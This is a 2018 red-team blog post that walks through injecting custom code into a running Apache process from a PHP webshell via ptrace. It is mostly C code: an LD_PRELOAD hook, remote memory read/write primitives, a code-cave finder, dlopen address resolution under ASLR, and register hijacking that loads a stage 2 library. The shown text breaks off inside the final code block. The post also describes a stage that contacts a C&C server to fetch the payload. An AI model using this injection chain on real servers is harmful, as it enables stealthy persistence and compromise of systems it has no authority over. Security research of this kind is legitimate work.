<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Parasiting web server process with webshells in permissive environments | Doomsday Vault</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="Parasiting web server process with webshells in permissive environments" />
<meta name="author" content="X-C3LL" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Example of how to abuse permissive environments to infect processes with custom code using ptrace" />
<meta property="og:description" content="Example of how to abuse permissive environments to infect processes with custom code using ptrace" />
<link rel="canonical" href="http://localhost:4000/posts/2018/02/24/parasite-web-server-process.html" />
<meta property="og:url" content="http://localhost:4000/posts/2018/02/24/parasite-web-server-process.html" />
<meta property="og:site_name" content="Doomsday Vault" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2018-02-24T13:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Parasiting web server process with webshells in permissive environments" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2018-02-24T13:00:00+01:00","datePublished":"2018-02-24T13:00:00+01:00","description":"Example of how to abuse permissive environments to infect processes with custom code using ptrace","headline":"Parasiting web server process with webshells in permissive environments","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2018/02/24/parasite-web-server-process.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2018/02/24/parasite-web-server-process.html"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
    <!--[if lt IE 9]>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
    <![endif]-->
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->

  </head>
  <body>
    <div class="wrapper">
      <header>

        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>

        
          <img src="/assets/img/logo.jpg" alt="Logo" />
        

        <p>X-C3LL's Personal Blog :)</p>


        
        <ul class="downloads">
          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
        </ul>
        
               <nav>
  <ul>
    <li><a href="/">Home</a></li>
  <li><a href="/about.html">About</a></li>
    <li><a href="/cves.html">CVEs</a></li>
    <li><a href="/tools.html">Tools</a></li>
    <li><a href="/stuff.html">Slides & Articles</a></li>
  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
  
</ul>
</nav>
      </header>
      <section>

      <small>24 February 2018</small>
<h1>Parasiting web server process with webshells in permissive environments</h1>


<p>        
Some time ago in a Red Team operation I bypassed an uploader and deployed a little webshell. I had to bypass disable_functions and open_basedir using the trick that I explained <a href="https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/">in this article</a> (and I released a tool called <a href="https://github.com/TarlogicSecurity/Chankro">Chankro</a> to automate this process). Before continuing reading this article, please read and understand how the bypass of disable_functions works because we are going to rely on it to perform this attack later.</p>

<p>        
After few minutes looking for juicy files with passwords or configurations in the compromised server I found something really interesting: a configuration script with these lines inside:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nb">echo </span>1 <span class="o">&gt;</span> /proc/sys/fs/suid_dumpable
<span class="nb">echo </span>0 <span class="o">&gt;</span> /proc/sys/kernel/yama/ptrace_scope
...
</code></pre></div></div>
<p>        
Probably this configuration is used in dev servers to allow some kind of debugging (basically we can use ptrace in any process of our user, even if it just dropped privileges -more info <a href="http://linuxinsight.com/proc_sys_fs_suid_dumpable.html">here</a> and <a href="https://www.kernel.org/doc/Documentation/security/Yama.txt">here</a>). In our case, this is a great opportunity to test something I had in my head: use our own webshell to parasite a legitimate process in the server.</p>

<p>        
The idea is taken directly from this post called <a href="https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/">Linux ptrace introduction AKA injecting into sshd for fun</a> and a lot of code will be reused (I do not like to reinvent the wheel).</p>

<h2 id="road-to-inject-code-in-a-legitimate-apache-process">Road to inject code in a legitimate Apache process</h2>
<p>        
Our objective is to inject arbitrary code in an Apache process (the one that is running our PHP webshell), so we can use this process to contact our C&amp;C and keep a Plan B to retake the control of the server. We are going to do all of this with the user that runs our webshell (www-data in my example). So the main idea is to split the operation in 3 stages:</p>

<ul>
  <li><strong>Stage 0</strong>: a PHP script that will execute mail() and set LD_PRELOAD with our Stage 1 (read the article where I talk about how to bypass disable_functions). It will pass the PID to infect as an env var.</li>
  <li><strong>Stage 1</strong>: a shared object that will be loaded by sendmail. It contains a hook that will contact our C&amp;C, download our stage 2, and inject it in the process that is executing our webshell.</li>
  <li><strong>Stage 2</strong>: just a shared object. When this is loaded it will write a log to /tmp, so we can verify that the injection was correct.</li>
</ul>

<p>        
So… Lets go!</p>

<h2 id="injecting-code-with-ptrace-the-lazy-way">Injecting code with ptrace (The lazy way)</h2>

<p>        
In our stage 1 we will need to hook a function called in sendmail in order to trigger our infector, we need a skeleton similar to:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1">//Our infector</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">daemonize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">signal</span><span class="p">(</span><span class="n">SIGHUP</span><span class="p">,</span> <span class="n">SIG_IGN</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="n">uid_t</span> <span class="nf">geteuid</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">uid_t</span> <span class="p">(</span><span class="o">*</span><span class="n">orig_geteuid</span><span class="p">)();</span>
  <span class="n">orig_geteuid</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"geteuid"</span><span class="p">);</span>
  <span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
  <span class="n">daemonize</span><span class="p">();</span>
  <span class="n">pwn</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">orig_geteuid</span><span class="p">();</span>
<span class="p">}</span>

</code></pre></div></div>
<p>        
If we check the libs loaded by an Apache process we can notice that libdl is already loaded:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gidorah@kaiju:~|⇒  sudo cat /proc/15922/maps | grep libdl
7f4b292a7000-7f4b292aa000 r-xp 00000000 08:01 2360320                    /lib/x86_64-linux-gnu/libdl-2.19.so
7f4b292aa000-7f4b294a9000 ---p 00003000 08:01 2360320                    /lib/x86_64-linux-gnu/libdl-2.19.so
7f4b294a9000-7f4b294aa000 r--p 00002000 08:01 2360320                    /lib/x86_64-linux-gnu/libdl-2.19.so
7f4b294aa000-7f4b294ab000 rw-p 00003000 08:01 2360320                    /lib/x86_64-linux-gnu/libdl-2.19.so
</code></pre></div></div>
<p>        
That is cool because things will be much easier. Our plan will be use this stage 1 to inject a little stub of code inside the target process, then change the program counter to point the address of our stub. Our stub will be just a call to dlopen() with our stage 2 and RLTD_LAZY as params (as libdl is loaded, we only need to recalculate the address of dlopen because of ASLR).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Stub</span>
<span class="kt">void</span> <span class="nf">injectme</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// To do the call and SIGTRAP (int3 for debugging purposes)</span>
    <span class="n">asm</span><span class="p">(</span>
        <span class="s">"mov $2, %esi</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"call *%rax</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"int $0x03</span><span class="se">\n</span><span class="s">"</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>        
First of all we are going to attach to the desired process with ptrace and save the registers at this moment (we do no want to crash our target process, so we need to restore everything to his natural state after our injection):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">infector</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">p_check</span><span class="p">,</span> <span class="n">waitpidstatus</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">oldregs</span><span class="p">,</span> <span class="n">regs</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">code_cave_address</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">oldcode</span><span class="p">;</span> 
    
    <span class="n">p_check</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">p_check</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">waitpidstatus</span><span class="p">,</span> <span class="n">WUNTRACED</span><span class="p">)</span> <span class="o">!=</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Get a copy of current registers</span>
    <span class="n">p_check</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">p_check</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Oldregs is our backup, and regs will be a copy to edit</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">regs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_regs_struct</span><span class="p">));</span>

</code></pre></div></div>
<p>        
We need to locate a memory region in the remote process to write our code stub. To accomplish this mission we can retrieve an address by reading /proc/$PID/maps and searching for a r-x region.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Find a region for our code cave</span>
<span class="c1">// Copied from https://github.com/gaffe23/linux-inject/blob/master/utils.c</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="nf">freespaceaddr</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">850</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">perms</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
    <span class="n">sprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"/proc/%d/maps"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="mi">850</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"%lx-%*lx %s %*s %s %*d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">perms</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">perms</span><span class="p">,</span> <span class="s">"r-xp"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>        
In order to read and write remote memory we will need primitives to speed up the process:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Primitives are taken from https://github.com/xpn/ssh-inject/blob/master/inject.c</span>
<span class="kt">void</span> <span class="nf">ptraceRead</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">word</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="k">sizeof</span><span class="p">(</span><span class="n">word</span><span class="p">),</span> <span class="n">word</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">word</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_PEEKTEXT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{;</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">word</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">ptraceWrite</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">word</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="k">sizeof</span><span class="p">(</span><span class="n">word</span><span class="p">),</span> <span class="n">word</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">word</span><span class="p">,</span> <span class="n">data</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">word</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{;</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>        
So, with all this code, we can: search for a r-x region, read memory and write memory. That is nice!. Have in mind that we will overwrite already-existing code in that memory region, so it <strong>is really important before insert our code</strong>. After our code is executed, we are going to restore it’s original content. So do the backup:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="c1">// Find a memory region with executable perms</span>
    <span class="n">code_cave_address</span> <span class="o">=</span> <span class="n">freespaceaddr</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">code_cave_address</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>   
    
    <span class="c1">// Backup whatever there is at that region    </span>
    <span class="n">oldcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="n">CAVE_SIZE</span><span class="p">);</span>
    <span class="n">ptraceRead</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span><span class="p">,</span> <span class="n">oldcode</span><span class="p">,</span> <span class="n">CAVE_SIZE</span><span class="p">);</span>
</code></pre></div></div>
<p>        
Let’s inject our code and modify registers (it is x86_64, so RAX must be the address of dlopen, RDI the location of our stage 2 and RSI the value of RTLD_LAZY). Of course we put RIP pointing to our stub (<strong>injectme()</strong>), so when the execution will be resumed our code will be executed:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Now is time to overwrite the code cave with our code   </span>
    <span class="n">ptraceWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span><span class="p">,</span> <span class="s">"/dev/shm/ko.so</span><span class="se">\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span> <span class="c1">// Stage 2 location</span>
    <span class="n">ptraceWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">ptraceWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">injectme</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>

    <span class="c1">// Change program counter to our inserted code</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">code_cave_address</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
    
    <span class="c1">// Now we need to follow the call convention so:</span>
    <span class="c1">// - RAX =&gt; must be the address of remote dlopen()</span>
    <span class="c1">// - RDI =&gt; address where "/dev/shm/ko.so" string lies (first dlopen parameter)</span>
    <span class="c1">// - RSI =&gt; RTLD_LAZY value -2- (second dlopen parameter)</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">dlopen_addr</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">code_cave_address</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
</code></pre></div></div>
<p>        
But wait, wait! How do we know the address of dlopen()? It is a bit tricky because ASLR: first we need to find the address in our own process and check the location of libdl in /proc/self/maps, so we can calculate the offset value. Then we check the libdl address at /proc/$PID/maps and add the offset value :)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Use this function to calculate the dlopen() addr in remote pid</span>
<span class="c1">// This is needed because of ASLR :(</span>
<span class="c1">// IMPORTANT!!!! I hardcoded the name of the .so as LIBDLSO because it is just a PoC. You need to retrieve it at runtime ;D</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="nf">dlopen_addr</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">remote_libdl_base</span><span class="p">,</span> <span class="n">offset_dlopen</span><span class="p">,</span> <span class="n">remote_dlopen_address</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">local_libdl_base</span><span class="p">,</span> <span class="o">*</span><span class="n">local_dlopen_address</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">850</span><span class="p">];</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>

    <span class="c1">// First we need to load libdl and save the address (debug purposes)</span>
    <span class="n">local_libdl_base</span> <span class="o">=</span> <span class="n">dlopen</span><span class="p">(</span><span class="n">LIBDLSO</span><span class="p">,</span> <span class="n">RTLD_LAZY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">local_libdl_base</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="c1">// Next we are going to resolve the dlopen() symbol</span>
    <span class="n">local_dlopen_address</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">local_libdl_base</span><span class="p">,</span> <span class="s">"dlopen"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">local_dlopen_address</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="c1">// Read local address</span>
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/proc/self/maps"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="mi">850</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"%llx-%*lx %*s %*s %*s %*d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">local_libdl_base</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">LIBDLSO</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> 
    <span class="c1">// Calculate the offset (libdl  address - dlopen address)</span>
    <span class="n">offset_dlopen</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">local_dlopen_address</span> <span class="o">-</span> <span class="n">local_libdl_base</span><span class="p">);</span>
    
    <span class="c1">// Now we need to extract the remote libdl  address</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">"/proc/%d/maps"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span> 
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="mi">850</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"%llx-%*lx %*s %*s %*s %*d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">remote_libdl_base</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">LIBDLSO</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
        
    <span class="c1">// And finally calculate the address of the remote dlopen</span>
    <span class="n">remote_dlopen_address</span> <span class="o">=</span> <span class="n">remote_libdl_base</span> <span class="o">+</span> <span class="n">offset_dlopen</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">remote_dlopen_address</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>        
At this point we have:</p>
<ul>
  <li>Our stub injected in the remote process</li>
  <li>The CPU registers in the correct state</li>
</ul>

<p>        
So we only need to resume the execution and restore everything to his natural state:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    	<span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">waitpidstatus</span><span class="p">,</span> <span class="n">WUNTRACED</span><span class="p">);</span>
        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>

        <span class="c1">// Now is time to restore everything to his original status :)</span>
        <span class="n">ptraceWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span><span class="p">,</span> <span class="n">oldcode</span><span class="p">,</span> <span class="n">CAVE_SIZE</span><span class="p">);</span>
